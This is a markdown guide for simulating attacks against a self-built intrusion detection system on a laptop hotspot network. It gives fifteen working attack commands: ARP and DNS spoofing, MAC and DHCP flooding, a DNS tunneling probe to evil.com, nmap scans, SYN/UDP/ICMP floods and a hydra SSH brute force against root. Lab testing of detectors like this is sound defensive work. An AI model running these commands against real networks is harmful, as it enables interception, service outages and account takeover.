# IDPS Attack Simulation Guide (Hotspot Router Topology)

This guide is tailored specifically to your demonstration topology where your laptop acts as the router/hotspot.

## ⚙️ Topology & Prerequisites
- **The IDPS / Gateway (Your Laptop):** 
  - Shares internet from USB (`enx2a7345453743`) to Wi-Fi Hotspot (`wlp1s0`).
  - Acts as the DHCP server and Gateway for the network (Usually IP `10.42.0.1` or `192.168.43.1` on Linux hotspots).
- **The Attacker (Kali Machine):** Connected to the laptop's Wi-Fi hotspot. We will assume its interface is `wlan0`.
- **The Victim (Other Phone):** Connected to the laptop's Wi-Fi hotspot.

*Note: In the commands below, replace `<LAPTOP_IP>` with your laptop's hotspot IP (e.g., `10.42.0.1`) and `<VICTIM_IP>` with the other phone's IP.*

---

## 1. Local Network & Layer 2 Attacks

### 1. ARP Spoofing
**Tool:** `arpspoof`
**Command (Run on Kali):** 
```bash
# Spoof the Victim Phone into thinking Kali is the Laptop (Router)
sudo arpspoof -i wlan0 -t <VICTIM_IP> <LAPTOP_IP>
```
**What happens:** The IDPS on the laptop monitors ARP traffic on the hotspot and detects that multiple MAC addresses are trying to claim the IP addresses.

### 2. ARP Flooding
**Tool:** `hping3`
**Command (Run on Kali):** 
```bash
sudo hping3 -c 1000 -i u1 --interface wlan0 255.255.255.255
```
**What happens:** Blasts the hotspot network with broadcast ARP requests, exceeding the IDPS threshold of 50 pkts/sec.

### 3. MAC Flooding (CAM Table Exhaustion)
**Tool:** `macof`
**Command (Run on Kali):** 
```bash
sudo macof -i wlan0
```
**What happens:** Generates thousands of packets with random, fake source MAC addresses. The IDPS will detect >100 unique MACs per second hitting the `wlp1s0` interface.

### 4. DHCP Starvation
**Tool:** `yersinia`
**Command (Run on Kali):** 
```bash
sudo yersinia dhcp -attack 1 -interface wlan0
```
**What happens:** Sends a massive flood of `DHCP DISCOVER` packets to your laptop. The IDPS detects this before the laptop's real DHCP server runs out of IP addresses.

### 5. Rogue DHCP Server
**Tool:** `yersinia`
**Command (Run on Kali):** 
```bash
sudo yersinia dhcp -attack 2 -interface wlan0
```
**What happens:** Kali starts broadcasting fake `DHCP OFFER` replies to the other phone. Since the IDPS knows the laptop itself (`<LAPTOP_IP>`) is the only legitimate DHCP server, it immediately flags Kali.

---

## 2. DNS Anomalies & Infrastructure Abuse

### 6. DNS Spoofing
**Tool:** `ettercap`
**Command (Run on Kali):** 
```bash
sudo ettercap -T -q -M arp:remote -P dns_spoof /<VICTIM_IP>// /<LAPTOP_IP>//
```
**What happens:** The IDPS sees a DNS reply coming from Kali's IP instead of the Laptop/Internet, flagging it as spoofing.

### 7. DNS Tunneling
**Tool:** `nslookup` (or Dig)
**Command (Run on Kali):** 
```bash
nslookup AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.evil.com <LAPTOP_IP>
```
**What happens:** Sends an extremely long domain name through your laptop router. The IDPS inspects the UDP payload and flags the tunneling attempt.

---

## 3. Reconnaissance & Lateral Movement

### 8. TCP Port Scanning
**Tool:** `nmap`
**Command (Run on Kali):** 
```bash
# Scan the laptop router
nmap -p 1-1000 -T4 <LAPTOP_IP>
```
**What happens:** Nmap rapidly scans the first 1000 ports. The IDPS catches the rapid connection attempts.

### 9. ICMP Sweep (Ping Sweep)
**Tool:** `nmap`
**Command (Run on Kali):** 
```bash
# Scan the entire hotspot subnet (e.g., 10.42.0.0/24)
nmap -sn 10.42.0.0/24
```
**What happens:** Sends pings to every possible IP on the hotspot. The IDPS tracks the source (Kali) pinging multiple destinations and flags the sweep.

### 10. SMB/Windows Service Scanning
**Tool:** `nmap`
**Command (Run on Kali):** 
```bash
nmap -p 139,445 --max-rate 100 <VICTIM_IP>
```
**What happens:** Kali tries to scan the other phone for Windows vulnerabilities. The IDPS (acting as the router in the middle) catches the probes on ports 139/445 via Snort signatures.

### 11. Abnormal Lateral Movement
**Tool:** `nmap`
**Command (Run on Kali):** 
```bash
# Scan the Victim Phone on Admin ports
nmap -p 22,3389,445 <VICTIM_IP>
```
**What happens:** Because Kali and the Victim Phone are both on the internal hotspot network, traffic between them passes through your laptop. The IDPS detects this internal-to-internal scan on admin ports.

---

## 4. Volumetric Denial of Service (DoS)

### 12. TCP SYN Flood
**Tool:** `hping3`
**Command (Run on Kali):** 
```bash
sudo hping3 -S --flood -V -p 80 <LAPTOP_IP>
```
**What happens:** Floods your laptop with incomplete handshakes.

### 13. UDP Flood
**Tool:** `hping3`
**Command (Run on Kali):** 
```bash
sudo hping3 --udp --flood <VICTIM_IP>
```
**What happens:** Kali attempts to blast the Victim Phone with UDP traffic. Your laptop IDPS catches it as it routes the traffic.

### 14. ICMP Flood
**Tool:** `hping3`
**Command (Run on Kali):** 
```bash
sudo hping3 -1 --flood <LAPTOP_IP>
```
**What happens:** Sends a continuous stream of pings, triggering the ICMP flood threshold.

---

## 5. Brute Force & Authentication

### 15. Authentication Brute-Force Attempts
**Tool:** `hydra`
**Command (Run on Kali):** 
```bash
# Attempt to SSH into the Laptop Router
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<LAPTOP_IP>
```
**What happens:** Hydra attempts rapid logins. The IDPS triggers a critical alert due to the high volume of SSH requests in a 3-second window.
